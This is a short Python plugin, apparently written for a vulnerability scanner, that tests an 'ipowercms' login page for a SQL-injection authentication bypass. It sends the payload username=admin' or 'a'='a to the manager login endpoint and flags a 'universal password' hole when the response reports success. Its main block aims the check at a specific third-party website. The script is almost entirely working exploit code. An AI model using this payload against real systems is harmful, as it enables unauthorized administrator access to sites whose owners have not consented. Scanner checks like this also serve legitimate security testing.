#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.wooyun.org/bugs/wooyun-2010-0110152

def assign(service, arg): 
    if service == "ipowercms":
        return True, arg
		
def audit(arg): 
    payload = 'm/manager/login.xml.php?username=admin\'%20or%20\'a\'=\'a&password=123&vcode='
    code, head, res, errcode, _ = curl.curl2(arg+payload)
    if code == 200 and '<v>1</v>' in res:
        security_hole('万能密码 '+arg+payload)
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('ipowercms', 'http://www.cqukja.com/')[1])
	
